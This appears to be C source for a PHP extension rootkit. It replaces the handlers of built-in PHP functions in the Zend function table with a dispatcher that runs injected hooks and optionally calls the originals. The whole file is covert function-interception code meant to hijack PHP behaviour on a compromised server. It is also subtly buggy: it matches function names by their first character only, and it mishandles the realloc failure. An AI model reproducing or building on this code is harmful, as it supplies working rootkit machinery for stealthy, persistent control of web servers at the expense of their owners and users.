#include "rootkit_hook.h"

int hook_list_total = 0;
Hook *hook_list = NULL;

bool rootkit_hook_function(const char *name, void(*hook), bool execute_original)
{
	// Table for the function calls
	zend_function *func = zend_hash_str_find_ptr(
		CG(function_table),
		name,
		strlen(name));

	// If the hook function is not provided we have nothing to do here...
	if (!hook || func == NULL)
	{
		ROOTKIT_PRINTF("--> Missing hook function.\n");
		return false;
	}

	// New hook struct with the whole needed data to intercept the call
	Hook new_hook_function;
	new_hook_function.name = (char *)name;
	new_hook_function.original = func->internal_function.handler;
	new_hook_function.hook = hook;
	new_hook_function.execute_original = execute_original;

	int hook_size = sizeof(Hook);
	int hook_list_size = hook_list_total == 0 ? 0 : hook_list_total * hook_size;
	int hook_list_new_size = hook_list_size + hook_size;

	hook_list = (Hook*)realloc(hook_list,  hook_list_new_size);

	if (hook_list == NULL) {
		ROOTKIT_PRINTF("--> Error reallocating memory....\n");
		return false;
	}

	hook_list[hook_list_total] = new_hook_function;
	func->internal_function.handler = *zif_hook_main_entry;
	
	hook_list_total++;

	return true;
}

/*
 * This method is the manager for all hooked functions.
 * Whenever a hooked function is called, this method will know wheter is needed
 * to execute some executions or not and will call the original function if it's necessary.
 */
PHP_FUNCTION(hook_main_entry)
{
	const char* current_function_name = get_active_function_name(TSRMLS_C);

	int i;

	for (i = 0; i < hook_list_total; i++)
	{
		Hook *hook_function = &hook_list[i];

		if (*current_function_name != *hook_function->name) {
			continue;
		}

		ROOTKIT_PRINTF("--> Executing hook method: %s\n", hook_function->name);
		(*hook_function->hook)(execute_data, return_value);

		if (hook_function->execute_original) {
			ROOTKIT_PRINTF("--> Executing original method for %s\n", hook_function->name);
			(*hook_function->original)(execute_data, return_value);
		}
	}
}